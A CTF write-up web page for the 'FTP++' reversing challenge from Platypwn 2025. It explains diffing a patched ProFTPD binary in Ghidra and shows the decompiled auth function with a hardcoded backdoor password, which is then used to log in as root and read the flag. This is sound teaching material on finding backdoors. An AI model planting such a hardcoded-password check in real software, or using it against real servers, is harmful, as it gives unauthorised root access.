@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+<head>
+    <meta charset="UTF-8">
+    <title>Pp25 - &#x27;Ftp++&#x27;</title>
+    <link rel="stylesheet" href="/style.css">
+    <meta name="color-scheme" content="dark light">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="alternate" type="application/atom+xml" title="Computerdores (Atom)" href="https://jann.stute.dev/atom.xml">
+    <link rel="alternate" type="application/rss+xml" title="Computerdores (RSS)" href="https://jann.stute.dev/rss.xml">
+    <!-- Extras -->
+    <meta name="robots" content="index, follow">
+    <meta name="viewport" content="width=device-width, inital-scale=1">
+    <link rel="canonical" href="https:&#x2F;&#x2F;jann.stute.dev&#x2F;writeups&#x2F;pp25&#x2F;pp25-ftppp&#x2F;">
+    
+    <meta name="title" content="Pp25 - &#x27;Ftp++&#x27;">
+    <meta name="description" content="A writeup for the &#x27;FTP++&#x27; challenge from the Platypwn 2025.">
+    
+    
+
+<link rel="stylesheet" href="/syntax.css">
+
+</head>
+
+<body>
+    <header>
+        <h1>Computerdores</h1>
+        <nav>
+            [<a href="https://jann.stute.dev">home</a>]
+            [<a href="https://jann.stute.dev/blog/">blog</a>]
+            [<a href="https://jann.stute.dev/writeups/">writeups</a>]
+            [<a href="https://jann.stute.dev/guestbook/">guestbook</a>]
+            [<a href="https://jann.stute.dev/about/">about</a>]
+        </nav>
+    </header>
+
+    <main>
+        
+<h1>PP25 - &#x27;FTP++&#x27;</h1>
+<p><b>Written: 2025-11-15</b></p>
+
+<hr>
+<blockquote>
+<p>I installed this awesome sftp server that a stranger on the internet gave me, they even improved it just for me!
+Though they didn't want to give me the source code for the patch for some reason, not sure why...
+Anyway check it out, I gave you an account on my instance so you can use it too, it's super secure!</p>
+<p>Credentials: <code>friend:sup3r_s3cur3</code></p>
+<p>Flag Location: <code>/root/flag/flag.txt</code>
+(Note that the FTP root is the user's home directory)</p>
+<p><code>proftpd.patch</code> is intentionally not included; To use the Dockerfile create an empty file with that name.</p>
+<p>Note: Connections to the sftp server take around 10s for the initial connection.</p>
+</blockquote>
+<p><strong>Author:</strong> Computerdores - That's me!</p>
+<p><strong>Categories:</strong> rev</p>
+<p><strong>Flag:</strong> <code>PP{b1n4ry_p4tch_d1ff1ng_ftw}</code></p>
+<p><strong>Challenge Source</strong>: Planned to be published; not done at time of writing</p>
+<h1 id="recon">Recon</h1>
+<p>We get access to a running instance of ProFTPD, upon logging in with the provided credentials<sup class="footnote-reference"><a href="#1">1</a></sup> there are a couple of files we can download:</p>
+<ul>
+<li><code>Dockerfile</code></li>
+<li><code>proftpd.conf</code></li>
+<li><code>compose.yaml</code></li>
+<li><code>proftpd</code></li>
+</ul>
+<p>Besides <code>proftpd</code> these files seem to be what was used to host the instance of ProFTPD that we downloaded them from.
+From looking at the Dockerfile we learn that the running ProFTPD was apparently patched, however, we don't get access to the patch.
+Furthermore, we can see that the compiled and stripped <code>proftpd</code> is copied to the user directory of the user we logged in with.
+This means that the <code>proftpd</code> binary we downloaded has the same patches applied, and is in fact the very same, as the running instance.</p>
+<h1 id="planned-approach">Planned Approach</h1>
+<p>The patch being omitted together with the description makes it quite clear that the missing patch introduces a security vulnerability / backdoor.
+Since we know that the binary is patched and have the identical build environment it was built in, we can build it again without the patch which should lead to a binary that is nearly identical except for the patched parts.
+We can then use binary patch diffing to investigate the parts of the binary that have changed (Ghidra supports this).</p>
+<h1 id="solve">Solve</h1>
+<p>First, to get the unpatched binary, we can simply add an empty <code>proftpd.patch</code><sup class="footnote-reference"><a href="#2">2</a></sup>, run <code>docker compose up</code> and then download the unpatched <code>proftpd</code> as <code>proftp_unpatched</code> like we did earlier (Don't forget <code>docker compose down</code> to clean up the containers)<sup class="footnote-reference"><a href="#3">3</a></sup>.
+Now it's a good idea to rename the patched <code>proftpd</code> to <code>proftpd_patched</code> to prevent confusion.</p>
+<p>To do the actual binary patch diffing, we can load both version into Ghidra and open the "Version Tracking" tool.
+Next we create a new session with the unpatched binary as the source and the patched binary as destination, when asked we agree to analysing both binaries.
+Once both binaries have been fully analysed, we will start correlating them.</p>
+<p>First, add the five "Exact ..." correlators with default settings.
+Since these correlators only find exact matches, once they have run through, we can select all matches that were found and apply them<sup class="footnote-reference"><a href="#4">4</a></sup>.
+Second, we add the "BSim Function Matching", also with default settings.
+This matcher is based on a heuristic so the results vary in how close they are.
+At this point we have a lot of matches and before increasing this count even further by adding more matchers, we should first check that we don't already have any interesting matches.
+For this, we need to filter the results to what is interesting.</p>
+<p>To do this, we can open the "More Filters" menu and deselect "Match Type &gt; Data" and "Association Status &gt; Accepted".
+This will hide any data matches and any matches from the exact matchers (since those have already been accepted in the previous step).
+This should narrow the list down to ~100 matches, if the number of results is still significantly higher than is feasible to check by hand, try setting the score filter to something like "0.1 &lt;= Score &lt;= 0.999".
+Following the intuition that any match with a low confidence is unlikely to be correct and that any match with a very high confidence will not have any interesting changes, we can now sort by "Score" and consider the middle of the field results.
+In my case this leads to exactly one result with a score that isn't 0.0 or 1.0, this (patched) function looks like this:</p>
+<pre data-linenos data-lang="C" class="language-C z-code"><code class="language-C" data-lang="C"><table><tbody><tr><td>1</td><td><span class="z-source z-c">undefined8 <span class="z-meta z-function z-c"><span class="z-entity z-name z-function z-c">FUN_00191e50</span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function z-parameters z-c"><span class="z-meta z-group z-c"><span class="z-storage z-type z-c">long</span> <span class="z-variable z-parameter z-c">param_1</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-meta z-function z-c"> </span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span></span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">
+</span></span></span></td></tr><tr><td>2</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  undefined8 <span class="z-keyword z-operator z-c">*</span>puVar1<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>3</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-storage z-type z-c">int</span> iVar2<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>4</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  undefined8 uVar3<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>5</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-storage z-type z-c">long</span> lVar4<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>6</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span>pcVar5<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>7</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-storage z-type z-c">int</span> <span class="z-keyword z-operator z-c">*</span>piVar6<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>8</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span>pcVar7<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>9</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">
+</span></span></span></td></tr><tr><td>10</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  puVar1 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-keyword z-operator z-c">*</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>undefined8 <span class="z-keyword z-operator z-c">*</span><span class="z-keyword z-operator z-c">*</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>param_1 <span class="z-keyword z-operator z-arithmetic z-c">+</span> <span class="z-constant z-numeric z-integer z-hexadecimal z-c"><span class="z-punctuation z-definition z-numeric z-base z-c">0x</span>30</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>11</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  pcVar7 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-keyword z-operator z-c">*</span>puVar1<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>12</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  pcVar5 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>puVar1<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span><span class="z-constant z-numeric z-integer z-decimal z-c">2</span><span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>13</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  iVar2 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">strcmp</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">pcVar5<span class="z-punctuation z-separator z-c">,</span><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>t0t4lly_n0t_4_b4ckd00r<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>14</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>iVar2 <span class="z-keyword z-operator z-comparison z-c">!=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span></span></td></tr><tr><td>15</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">    uVar3 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">pr_cmd_alloc</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-keyword z-operator z-c">*</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>undefined8 <span class="z-keyword z-operator z-c">*</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>param_1 <span class="z-keyword z-operator z-arithmetic z-c">+</span> <span class="z-constant z-numeric z-integer z-hexadecimal z-c"><span class="z-punctuation z-definition z-numeric z-base z-c">0x</span>18</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-punctuation z-separator z-c">,</span><span class="z-constant z-numeric z-integer z-decimal z-c">1</span><span class="z-punctuation z-separator z-c">,</span>puVar1<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span><span class="z-constant z-numeric z-integer z-decimal z-c">1</span><span class="z-punctuation z-section z-brackets z-end z-c">]</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></td></tr><tr><td>16</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">    lVar4 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">FUN_00191d00</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">uVar3</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></td></tr><tr><td>17</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>lVar4 <span class="z-keyword z-operator z-comparison z-c">!=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span></span></span></td></tr><tr><td>18</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">      <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-keyword z-operator z-c">*</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-storage z-type z-c">int</span> <span class="z-keyword z-operator z-c">*</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>lVar4 <span class="z-keyword z-operator z-arithmetic z-c">+</span> <span class="z-constant z-numeric z-integer z-decimal z-c">8</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-keyword z-operator z-comparison z-c">!=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span></span></span></span></td></tr><tr><td>19</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        uVar3 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">mod_create_error</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">param_1</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></span></span></td></tr><tr><td>20</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-flow z-return z-c">return</span> uVar3<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></span></span></td></tr><tr><td>21</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">      <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span></span></span></span></td></tr><tr><td>22</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">      pcVar5 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">crypt</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">pcVar5<span class="z-punctuation z-separator z-c">,</span>pcVar7</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></span></td></tr><tr><td>23</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">      <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>pcVar5 <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span><span class="z-storage z-type z-c">char</span> <span class="z-keyword z-operator z-c">*</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span><span class="z-constant z-numeric z-integer z-hexadecimal z-c"><span class="z-punctuation z-definition z-numeric z-base z-c">0x</span>0</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span></span></span></span></td></tr><tr><td>24</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        piVar6 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">__errno_location</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></span></span></td></tr><tr><td>25</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        pcVar7 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">strerror</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-keyword z-operator z-c">*</span>piVar6</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></span></span></td></tr><tr><td>26</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">pr_log_pri</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-constant z-numeric z-integer z-decimal z-c">5</span><span class="z-punctuation z-separator z-c">,</span><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>crypt(3) failed: <span class="z-constant z-other z-placeholder z-c">%s</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-separator z-c">,</span>pcVar7</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></span></span></td></tr><tr><td>27</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">      <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span></span></span></span></td></tr><tr><td>28</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">      <span class="z-keyword z-control z-c">else</span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span></span></span></span></td></tr><tr><td>29</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        iVar2 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">strcmp</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">pcVar5<span class="z-punctuation z-separator z-c">,</span>pcVar7</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></span></span></td></tr><tr><td>30</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">        <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>iVar2 <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-keyword z-control z-flow z-goto z-c">goto</span> LAB_00191eda<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></span></span></td></tr><tr><td>31</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">      <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span></span></span></span></td></tr><tr><td>32</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">    <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span></span></span></td></tr><tr><td>33</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-flow z-return z-c">return</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></span></td></tr><tr><td>34</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">  <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span></span></td></tr><tr><td>35</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-entity z-name z-label z-c">LAB_00191eda</span><span class="z-punctuation z-separator z-c">:</span>
+</span></span></span></td></tr><tr><td>36</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  DAT_0027f178 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>mod_auth_unix.c<span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>37</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  uVar3 <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">mod_create_ret</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c">param_1<span class="z-punctuation z-separator z-c">,</span><span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-separator z-c">,</span><span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-separator z-c">,</span><span class="z-constant z-numeric z-integer z-decimal z-c">0</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>38</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c">  <span class="z-keyword z-control z-flow z-return z-c">return</span> uVar3<span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span></td></tr><tr><td>39</td><td><span class="z-source z-c"><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"></span></span><span class="z-meta z-function z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span></span>
+</span></td></tr></tbody></table></code></pre>
+<p>Even without ghidra highlighting line 12-14 as changed we can easily see that there seems to be a backdoor here!
+Since the comparison does not seem to involve the user account name at all, we can just try to login with this password as root, and it works!</p>
+<p>Finally, to get the flag we can now simply download it using <code>get flag/flag.txt</code>.</p>
+<hr />
+<p>Footnotes:</p>
+<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
+<p>e.g. using <code>sftp sftp://friend@10.80.12.103:22</code> + <code>get *</code></p>
+</div>
+<div class="footnote-definition" id="2"><sup class="footnote-definition-label">2</sup>
+<p>If it contains a newline (e.g. when created via <code>echo &gt; proftp.patch</code>) it will fail, <code>touch proftpd.patch</code> should work.</p>
+</div>
+<div class="footnote-definition" id="3"><sup class="footnote-definition-label">3</sup>
+<p>It is also possible to remove the <code>strip</code> command from the Dockerfile prior to doing this. This will lead to an unpatched binary with more differences, but in return we have the usual advantages of debug symbols.</p>
+</div>
+<div class="footnote-definition" id="4"><sup class="footnote-definition-label">4</sup>
+<p>see: button in the top right with a green flag icon</p>
+</div>
+
+
+    </main>
+
+    <footer>
+        <hr>
+        <p>
+            <span>[<a href="https://jann.stute.dev/privacy/">privacy</a>]</span>
+            <span>[<a href="https://darktheme.club/">Proud member of darktheme.club</a>]</span>
+            <span>[<a href="https://no-js.club/">Member of the no-JS club</a>]</span>
+            <span>[<a href="https://jeffhuang.com/designed_to_last/">This page was designed to last</a>]</span>
+            <span>[<a href="https://www.getzola.org/">Built using Zola</a>]</span>
+            <span>[<a href="https://github.com/Computerdores/computerdores.github.io">Source Code available on GitHub</a>]</span>
+        </p>
+    </footer>
+</body>
+
+</html>
